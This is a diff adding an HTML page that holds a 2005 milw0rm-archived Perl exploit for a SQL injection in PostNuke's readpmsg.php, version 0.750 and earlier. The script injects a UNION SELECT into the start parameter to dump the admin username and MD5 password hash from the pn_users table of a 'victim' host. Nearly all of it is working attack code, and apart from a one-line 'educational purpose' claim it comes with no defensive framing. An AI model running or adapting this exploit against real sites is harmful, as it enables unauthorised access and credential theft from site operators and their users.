@@ -1,0 +1,69 @@
+<html>
+<head>
+<title>PostNuke <= 0.750 readpmsg.php SQL Injection Exploit</title>
+<pre>
+#!/usr/bin/perl
+# This tools is only for educational purpose
+#
+# K-C0d3r a x0n3-h4ck friend !!!
+#
+# This exploit should give admin nick and md5 password
+#
+#-=[ PostNuke SQL Injection                     version : x=&gt; 0.750]=-
+#-=[                                                               ]=-
+#-=[ Discovered by sp3x                                            ]=-
+#-=[ Coded by K-C0d3r                                              ]=-
+#-=[ irc.xoned.net #x0n3-h4ck to find me   K-c0d3r[at]x0n3-h4ck.org]=-
+#
+# Greetz to mZ, 2b TUBE, off, rikky, milw0rm, str0ke
+#
+# !!! NOW IS PUBLIC (6-6-2005) !!!
+
+use IO::Socket;
+
+sub Usage {
+print STDERR &quot;Usage: KCpnuke-xpl.pl &lt;www.victim.com&gt; &lt;/path/to/modules.php&gt;\n&quot;;
+exit;
+}
+
+if (@ARGV &lt; 2)
+{
+ Usage();
+}
+
+if (@ARGV &gt; 2)
+{
+ Usage();
+}
+
+if (@ARGV == 2)
+{
+$host = @ARGV[0];
+$path = @ARGV[1];
+
+print &quot;[K-C0d3r] PostNuke SQL Injection [x0n3-h4ck]\n&quot;;
+print &quot;[+] Connecting to $host\n&quot;;
+
+$injection = &quot;$host\/$path?&quot;;
+$injection .= &quot;op=modload&amp;name=Messages&amp;file=readpmsg&amp;start=0&quot;;
+$injection .= &quot;%20UNION%20SELECT%20pn_uname,null,pn_uname,pn_pass,pn_pass,null,pn_pass,null&quot;;
+$injection .= &quot;%20FROM%20pn_users%20WHERE%20pn_uid=2\/*&amp;total_messages=1&quot;;
+
+$socket = new IO::Socket::INET (PeerAddr =&gt; &quot;$host&quot;,
+                                PeerPort =&gt; 80,
+                                Proto =&gt; 'tcp');
+                                die unless $socket;
+
+print &quot;[+] Injecting command ...\n&quot;;
+print $socket &quot;GET http://$injection HTTP/1.1\nHost: $host\n\n&quot;;
+while (&lt;$socket&gt;)
+{
+ print $_;
+ exit;
+}
+}
+
+# milw0rm.com [2005-06-05]
+</pre>
+</html>
+
